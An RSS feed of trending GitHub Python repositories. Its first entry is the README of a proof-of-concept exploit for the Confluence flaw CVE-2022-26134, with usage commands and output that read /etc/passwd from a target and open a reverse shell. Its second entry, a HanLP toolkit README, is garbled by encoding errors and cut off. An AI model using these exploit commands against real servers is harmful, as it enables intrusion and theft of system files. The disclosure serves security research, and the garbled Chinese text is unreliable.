<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-06-08T01:33:25Z</updated>
  <subtitle>Daily Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>jbaines-r7/through_the_wire</title>
    <updated>2022-06-08T01:33:25Z</updated>
    <id>tag:github.com,2022-06-08:/jbaines-r7/through_the_wire</id>
    <link href="https://github.com/jbaines-r7/through_the_wire" rel="alternate"></link>
    <summary type="html">&lt;p&gt;CVE-2022-26134 Proof of Concept&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Through the Wire&lt;/h1&gt; &#xA;&lt;p&gt;Through the Wire is a proof of concept exploit for &lt;a href=&#34;&#34;&gt;CVE-2022-26134&lt;/a&gt;, an OGNL injection vulnerability affecting Atlassian Confluence Server and Data Center versions &amp;lt;= 7.13.6 LTS and &amp;lt;= 7.18.0 &#34;Latest&#34;. This was originally a zero-day exploited in-the-wild.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html&#34;&gt;Vendor advisory&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence/&#34;&gt;Volexity &#34;in-the-wild&#34; write-up&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/&#34;&gt;Rapid7 write-up&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Through the Wire implements two different exploits. The reverse shell will shell out to &lt;code&gt;bash&lt;/code&gt; and therefore be more likely to be detected. The file reader executes from memory and is therefore unlikely to be detected.&lt;/p&gt; &#xA;&lt;p&gt;The exploits &lt;em&gt;only&lt;/em&gt; work on Linux installs of Confluence. They could work on Windows but I&#39;m also lazy. The exploits were tested against 7.13.6 LTS (likely enterprise targets) and 7.18.0 (last vulnerable &#34;release&#34;).&lt;/p&gt; &#xA;&lt;h2&gt;Usage examples&lt;/h2&gt; &#xA;&lt;h3&gt;Read a file&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;albinolobster@ubuntu:~/through_the_wire$ python3 through_the_wire.py --rhost 10.0.0.28 --rport 8090 --lhost 10.0.0.2 --protocol http:// --read-file /etc/passwd&#xA;&#xA;   _____ _                           _     &#xA;  /__   \ |__  _ __ ___  _   _  __ _| |__  &#xA;    / /\/ &#39;_ \| &#39;__/ _ \| | | |/ _` | &#39;_ \ &#xA;   / /  | | | | | | (_) | |_| | (_| | | | |&#xA;   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|&#xA;                               |___/       &#xA;   _____ _            __    __ _           &#xA;  /__   \ |__   ___  / / /\ \ (_)_ __ ___  &#xA;    / /\/ &#39;_ \ / _ \ \ \/  \/ / | &#39;__/ _ \ &#xA;   / /  | | | |  __/  \  /\  /| | | |  __/ &#xA;   \/   |_| |_|\___|   \/  \/ |_|_|  \___| &#xA;&#xA;                 jbaines-r7                &#xA;               CVE-2022-26134              &#xA;      &#34;Spit my soul through the wire&#34;    &#xA;                     ü¶û                   &#xA;&#xA;[+] Forking a netcat listener&#xA;[+] Using /usr/bin/nc&#xA;[+] Generating a payload to read: /etc/passwd&#xA;[+] Sending expoit at http://10.0.0.28:8090/&#xA;Listening on 0.0.0.0 1270&#xA;Connection received on 10.0.0.28 39384&#xA;root&lt;span&gt;‚ùå&lt;/span&gt;0:0:root:/root:/bin/bash&#xA;daemon&lt;span&gt;‚ùå&lt;/span&gt;1:1:daemon:/usr/sbin:/usr/sbin/nologin&#xA;bin&lt;span&gt;‚ùå&lt;/span&gt;2:2:bin:/bin:/usr/sbin/nologin&#xA;sys&lt;span&gt;‚ùå&lt;/span&gt;3:3:sys:/dev:/usr/sbin/nologin&#xA;sync&lt;span&gt;‚ùå&lt;/span&gt;4:65534:sync:/bin:/bin/sync&#xA;games&lt;span&gt;‚ùå&lt;/span&gt;5:60:games:/usr/games:/usr/sbin/nologin&#xA;man&lt;span&gt;‚ùå&lt;/span&gt;6:12&lt;span&gt;üë®&lt;/span&gt;/var/cache/man:/usr/sbin/nologin&#xA;lp&lt;span&gt;‚ùå&lt;/span&gt;7:7:lp:/var/spool/lpd:/usr/sbin/nologin&#xA;mail&lt;span&gt;‚ùå&lt;/span&gt;8:8:mail:/var/mail:/usr/sbin/nologin&#xA;news&lt;span&gt;‚ùå&lt;/span&gt;9:9:news:/var/spool/news:/usr/sbin/nologin&#xA;uucp&lt;span&gt;‚ùå&lt;/span&gt;10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&#xA;proxy&lt;span&gt;‚ùå&lt;/span&gt;13:13:proxy:/bin:/usr/sbin/nologin&#xA;www-data&lt;span&gt;‚ùå&lt;/span&gt;33:33:www-data:/var/www:/usr/sbin/nologin&#xA;backup&lt;span&gt;‚ùå&lt;/span&gt;34:34:backup:/var/backups:/usr/sbin/nologin&#xA;list&lt;span&gt;‚ùå&lt;/span&gt;38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&#xA;irc&lt;span&gt;‚ùå&lt;/span&gt;39:39:ircd:/var/run/ircd:/usr/sbin/nologin&#xA;gnats&lt;span&gt;‚ùå&lt;/span&gt;41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&#xA;nobody&lt;span&gt;‚ùå&lt;/span&gt;65534:65534:nobody:/nonexistent:/usr/sbin/nologin&#xA;systemd-network&lt;span&gt;‚ùå&lt;/span&gt;100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin&#xA;systemd-resolve&lt;span&gt;‚ùå&lt;/span&gt;101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin&#xA;systemd-timesync&lt;span&gt;‚ùå&lt;/span&gt;102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin&#xA;messagebus&lt;span&gt;‚ùå&lt;/span&gt;103:106::/nonexistent:/usr/sbin/nologin&#xA;syslog&lt;span&gt;‚ùå&lt;/span&gt;104:110::/home/syslog:/usr/sbin/nologin&#xA;_apt&lt;span&gt;‚ùå&lt;/span&gt;105:65534::/nonexistent:/usr/sbin/nologin&#xA;tss&lt;span&gt;‚ùå&lt;/span&gt;106:111:TPM software stack,,,:/var/lib/tpm:/bin/false&#xA;uuidd&lt;span&gt;‚ùå&lt;/span&gt;107:114::/run/uuidd:/usr/sbin/nologin&#xA;tcpdump&lt;span&gt;‚ùå&lt;/span&gt;108:115::/nonexistent:/usr/sbin/nologin&#xA;avahi-autoipd&lt;span&gt;‚ùå&lt;/span&gt;109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin&#xA;usbmux&lt;span&gt;‚ùå&lt;/span&gt;110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin&#xA;rtkit&lt;span&gt;‚ùå&lt;/span&gt;111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin&#xA;dnsmasq&lt;span&gt;‚ùå&lt;/span&gt;112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin&#xA;cups-pk-helper&lt;span&gt;‚ùå&lt;/span&gt;113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin&#xA;speech-dispatcher&lt;span&gt;‚ùå&lt;/span&gt;114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false&#xA;avahi&lt;span&gt;‚ùå&lt;/span&gt;115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin&#xA;kernoops&lt;span&gt;‚ùå&lt;/span&gt;116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin&#xA;saned&lt;span&gt;‚ùå&lt;/span&gt;117:123::/var/lib/saned:/usr/sbin/nologin&#xA;nm-openvpn&lt;span&gt;‚ùå&lt;/span&gt;118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin&#xA;hplip&lt;span&gt;‚ùå&lt;/span&gt;119:7:HPLIP system user,,,:/run/hplip:/bin/false&#xA;whoopsie&lt;span&gt;‚ùå&lt;/span&gt;120:125::/nonexistent:/bin/false&#xA;colord&lt;span&gt;‚ùå&lt;/span&gt;121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin&#xA;geoclue&lt;span&gt;‚ùå&lt;/span&gt;122:127::/var/lib/geoclue:/usr/sbin/nologin&#xA;pulse&lt;span&gt;‚ùå&lt;/span&gt;123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin&#xA;gnome-initial-setup&lt;span&gt;‚ùå&lt;/span&gt;124:65534::/run/gnome-initial-setup/:/bin/false&#xA;gdm&lt;span&gt;‚ùå&lt;/span&gt;125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false&#xA;sssd&lt;span&gt;‚ùå&lt;/span&gt;126:131:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin&#xA;albinolobster&lt;span&gt;‚ùå&lt;/span&gt;1000:1000:albinolobster,,,:/home/albinolobster:/bin/bash&#xA;systemd-coredump&lt;span&gt;‚ùå&lt;/span&gt;999:999:systemd Core Dumper:/:/usr/sbin/nologin&#xA;sshd&lt;span&gt;‚ùå&lt;/span&gt;127:65534::/run/sshd:/usr/sbin/nologin&#xA;postgres&lt;span&gt;‚ùå&lt;/span&gt;128:136:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash&#xA;confluence&lt;span&gt;‚ùå&lt;/span&gt;1001:1002:Atlassian Confluence:/home/confluence:/bin/sh&#xA;albinolobster@ubuntu:~/through_the_wire$ &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Get a shell&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;albinolobster@ubuntu:~/through_the_wire$ python3 through_the_wire.py --rhost 10.0.0.28 --rport 8090 --lhost 10.0.0.2 --protocol http:// --reverse-shell&#xA;&#xA;   _____ _                           _     &#xA;  /__   \ |__  _ __ ___  _   _  __ _| |__  &#xA;    / /\/ &#39;_ \| &#39;__/ _ \| | | |/ _` | &#39;_ \ &#xA;   / /  | | | | | | (_) | |_| | (_| | | | |&#xA;   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|&#xA;                               |___/       &#xA;   _____ _            __    __ _           &#xA;  /__   \ |__   ___  / / /\ \ (_)_ __ ___  &#xA;    / /\/ &#39;_ \ / _ \ \ \/  \/ / | &#39;__/ _ \ &#xA;   / /  | | | |  __/  \  /\  /| | | |  __/ &#xA;   \/   |_| |_|\___|   \/  \/ |_|_|  \___| &#xA;&#xA;                 jbaines-r7                &#xA;               CVE-2022-26134              &#xA;      &#34;Spit my soul through the wire&#34;    &#xA;                     ü¶û                   &#xA;&#xA;[+] Forking a netcat listener&#xA;[+] Using /usr/bin/nc&#xA;[+] Generating a reverse shell payload&#xA;[+] Sending expoit at http://10.0.0.28:8090/&#xA;Listening on 0.0.0.0 1270&#xA;Connection received on 10.0.0.28 39386&#xA;bash: cannot set terminal process group (34470): Inappropriate ioctl for device&#xA;bash: no job control in this shell&#xA;bash: /root/.bashrc: Permission denied&#xA;confluence@ubuntu:/opt/atlassian/confluence/bin$ id&#xA;id&#xA;uid=1001(confluence) gid=1002(confluence) groups=1002(confluence)&#xA;confluence@ubuntu:/opt/atlassian/confluence/bin$ &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Credit&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Greetz to APT31&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=AE8y25CcE6s&#34;&gt;Ye&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;PCAP || GTFO&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jbaines-r7/through_the_wire/files/8833875/confluence_two_pcap.zip&#34;&gt;confluence_two_pcap.zip&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Video || GTFO&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://youtu.be/GP9C4D0YNkM&#34;&gt;https://youtu.be/GP9C4D0YNkM&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>hankcs/HanLP</title>
    <updated>2022-06-08T01:33:25Z</updated>
    <id>tag:github.com,2022-06-08:/hankcs/HanLP</id>
    <link href="https://github.com/hankcs/HanLP" rel="alternate"></link>
    <summary type="html">&lt;p&gt;‰∏≠ÊñáÂàÜËØç ËØçÊÄßÊ†áÊ≥® ÂëΩÂêçÂÆû‰ΩìËØÜÂà´ ‰æùÂ≠òÂè•Ê≥ïÂàÜÊûê ÊàêÂàÜÂè•Ê≥ïÂàÜÊûê ËØ≠‰πâ‰æùÂ≠òÂàÜÊûê ËØ≠‰πâËßíËâ≤Ê†áÊ≥® Êåá‰ª£Ê∂àËß£ È£éÊ†ºËΩ¨Êç¢ ËØ≠‰πâÁõ∏‰ººÂ∫¶ Êñ∞ËØçÂèëÁé∞ ÂÖ≥ÈîÆËØçÁü≠ËØ≠ÊèêÂèñ Ëá™Âä®ÊëòË¶Å ÊñáÊú¨ÂàÜÁ±ªËÅöÁ±ª ÊãºÈü≥ÁÆÄÁπÅËΩ¨Êç¢ Ëá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜ&lt;/p&gt;&lt;hr&gt;&lt;h2 align=&#34;center&#34;&gt;HanLP: Han Language Processing&lt;/h2&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;a href=&#34;https://github.com/hankcs/HanLP/actions&#34;&gt; &lt;img alt=&#34;Unit Tests&#34; src=&#34;https://github.com/hankcs/hanlp/actions/workflows/unit-tests.yml/badge.svg?branch=master&#34;&gt; &lt;/a&gt; &#xA; &lt;a href=&#34;https://pypi.org/project/hanlp/&#34;&gt; &lt;img alt=&#34;PyPI Version&#34; src=&#34;https://img.shields.io/pypi/v/hanlp?color=blue&#34;&gt; &lt;/a&gt; &#xA; &lt;a href=&#34;https://pypi.org/project/hanlp/&#34;&gt; &lt;img alt=&#34;Python Versions&#34; src=&#34;https://img.shields.io/pypi/pyversions/hanlp?colorB=blue&#34;&gt; &lt;/a&gt; &#xA; &lt;a href=&#34;https://pepy.tech/project/hanlp&#34;&gt; &lt;img alt=&#34;Downloads&#34; src=&#34;https://pepy.tech/badge/hanlp&#34;&gt; &lt;/a&gt; &#xA; &lt;a href=&#34;https://mybinder.org/v2/gh/hankcs/HanLP/doc-zh?filepath=plugins%2Fhanlp_demo%2Fhanlp_demo%2Fzh%2Ftutorial.ipynb&#34;&gt; &lt;img alt=&#34;Âú®Á∫øËøêË°å&#34; src=&#34;https://mybinder.org/badge_logo.svg?sanitize=true&#34;&gt; &lt;/a&gt; &#xA;&lt;/div&gt; &#xA;&lt;h4 align=&#34;center&#34;&gt; &lt;a href=&#34;https://github.com/hankcs/HanLP/tree/master&#34;&gt;English&lt;/a&gt; | &lt;a href=&#34;https://github.com/hankcs/HanLP/tree/doc-ja&#34;&gt;Êó•Êú¨Ë™û&lt;/a&gt; | &lt;a href=&#34;https://hanlp.hankcs.com/docs/&#34;&gt;ÊñáÊ°£&lt;/a&gt; | &lt;a href=&#34;https://bbs.hankcs.com/&#34;&gt;ËÆ∫Âùõ&lt;/a&gt; | &lt;a href=&#34;https://github.com/wangedison/hanlp-jupyterlab-docker&#34;&gt;docker&lt;/a&gt; | &lt;a href=&#34;https://mybinder.org/v2/gh/hankcs/HanLP/doc-zh?filepath=plugins%2Fhanlp_demo%2Fhanlp_demo%2Fzh%2Ftutorial.ipynb&#34;&gt;‚ñ∂Ô∏èÂú®Á∫øËøêË°å&lt;/a&gt; &lt;/h4&gt; &#xA;&lt;p&gt;Èù¢ÂêëÁîü‰∫ßÁéØÂ¢ÉÁöÑÂ§öËØ≠ÁßçËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÂ∑•ÂÖ∑ÂåÖÔºåÂü∫‰∫éPyTorchÂíåTensorFlow 2.xÂèåÂºïÊìéÔºåÁõÆÊ†áÊòØÊôÆÂèäËêΩÂú∞ÊúÄÂâçÊ≤øÁöÑNLPÊäÄÊúØ„ÄÇHanLPÂÖ∑Â§áÂäüËÉΩÂÆåÂñÑ„ÄÅÁ≤æÂ∫¶ÂáÜÁ°Æ„ÄÅÊÄßËÉΩÈ´òÊïà„ÄÅËØ≠ÊñôÊó∂Êñ∞„ÄÅÊû∂ÊûÑÊ∏ÖÊô∞„ÄÅÂèØËá™ÂÆö‰πâÁöÑÁâπÁÇπ„ÄÇ&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://mybinder.org/v2/gh/hankcs/HanLP/doc-zh?filepath=plugins%2Fhanlp_demo%2Fhanlp_demo%2Fzh%2Ftutorial.ipynb&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/hankcs/OpenCC-to-HanLP/img/demo.gif&#34; alt=&#34;demo&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;ÂÄüÂä©‰∏ñÁïå‰∏äÊúÄÂ§ßÁöÑÂ§öËØ≠ÁßçËØ≠ÊñôÂ∫ìÔºåHanLP2.1ÊîØÊåÅÂåÖÊã¨ÁÆÄÁπÅ‰∏≠Ëã±Êó•‰øÑÊ≥ïÂæ∑Âú®ÂÜÖÁöÑ104ÁßçËØ≠Ë®Ä‰∏äÁöÑ10ÁßçËÅîÂêà‰ªªÂä°‰ª•ÂèäÂ§öÁßçÂçï‰ªªÂä°„ÄÇHanLPÈ¢ÑËÆ≠ÁªÉ‰∫ÜÂçÅÂá†Áßç‰ªªÂä°‰∏äÁöÑÊï∞ÂçÅ‰∏™Ê®°ÂûãÂπ∂‰∏îÊ≠£Âú®ÊåÅÁª≠Ëø≠‰ª£ËØ≠ÊñôÂ∫ì‰∏éÊ®°ÂûãÔºö&lt;/p&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;table&gt; &#xA;  &lt;thead&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;th&gt;ÂäüËÉΩ&lt;/th&gt; &#xA;    &lt;th&gt;RESTful&lt;/th&gt; &#xA;    &lt;th&gt;Â§ö‰ªªÂä°&lt;/th&gt; &#xA;    &lt;th&gt;Âçï‰ªªÂä°&lt;/th&gt; &#xA;    &lt;th&gt;Ê®°Âûã&lt;/th&gt; &#xA;    &lt;th&gt;Ê†áÊ≥®Ê†áÂáÜ&lt;/th&gt; &#xA;   &lt;/tr&gt; &#xA;  &lt;/thead&gt; &#xA;  &lt;tbody&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;ÂàÜËØç&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/tok_restful.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/tok_mtl.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/tok_stl.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/hanlp/pretrained/tok.html&#34;&gt;tok&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Á≤óÂàÜ/ÁªÜÂàÜ&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;ËØçÊÄßÊ†áÊ≥®&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/pos_restful.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/pos_mtl.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/pos_stl.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/hanlp/pretrained/pos.html&#34;&gt;pos&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://hanlp.hankcs.com/docs/annotations/pos/ctb.html&#34;&gt;CTB&lt;/a&gt;„ÄÅ&lt;a href=&#34;https://hanlp.hankcs.com/docs/annotations/pos/pku.html&#34;&gt;PKU&lt;/a&gt;„ÄÅ&lt;a href=&#34;https://hanlp.hankcs.com/docs/annotations/pos/863.html&#34;&gt;863&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;ÂëΩÂêçÂÆû‰ΩìËØÜÂà´&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/ner_restful.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/ner_mtl.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/ner_stl.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/hanlp/pretrained/ner.html&#34;&gt;ner&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://hanlp.hankcs.com/docs/annotations/ner/pku.html&#34;&gt;PKU&lt;/a&gt;„ÄÅ&lt;a href=&#34;https://hanlp.hankcs.com/docs/annotations/ner/msra.html&#34;&gt;MSRA&lt;/a&gt;„ÄÅ&lt;a href=&#34;https://hanlp.hankcs.com/docs/annotations/ner/ontonotes.html&#34;&gt;OntoNotes&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;‰æùÂ≠òÂè•Ê≥ïÂàÜÊûê&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/dep_restful.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/dep_mtl.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/dep_stl.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/hanlp/pretrained/dep.html&#34;&gt;dep&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://hanlp.hankcs.com/docs/annotations/dep/sd_zh.html&#34;&gt;SD&lt;/a&gt;„ÄÅ&lt;a href=&#34;https://hanlp.hankcs.com/docs/annotations/dep/ud.html&#34;&gt;UD&lt;/a&gt;„ÄÅ&lt;a href=&#34;https://hanlp.hankcs.com/docs/annotations/dep/pmt.html&#34;&gt;PMT&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;ÊàêÂàÜÂè•Ê≥ïÂàÜÊûê&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/con_restful.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/con_mtl.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/con_stl.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/hanlp/pretrained/constituency.html&#34;&gt;con&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://hanlp.hankcs.com/docs/annotations/constituency/ctb.html&#34;&gt;Chinese Tree Bank&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;ËØ≠‰πâ‰æùÂ≠òÂàÜÊûê&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/sdp_restful.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/sdp_mtl.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/sdp_stl.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/hanlp/pretrained/sdp.html&#34;&gt;sdp&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://hanlp.hankcs.com/docs/annotations/sdp/semeval16.html#&#34;&gt;CSDP&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;ËØ≠‰πâËßíËâ≤Ê†áÊ≥®&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/srl_restful.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/srl_mtl.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/srl_stl.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/hanlp/pretrained/srl.html&#34;&gt;srl&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://hanlp.hankcs.com/docs/annotations/srl/cpb.html&#34;&gt;Chinese Proposition Bank&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;ÊäΩË±°ÊÑè‰πâË°®Á§∫&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/amr_restful.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/amr_stl.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/hanlp/pretrained/amr.html&#34;&gt;amr&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://www.hankcs.com/nlp/corpus/introduction-to-chinese-abstract-meaning-representation.html&#34;&gt;CAMR&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;Êåá‰ª£Ê∂àËß£&lt;/td&gt; &#xA;    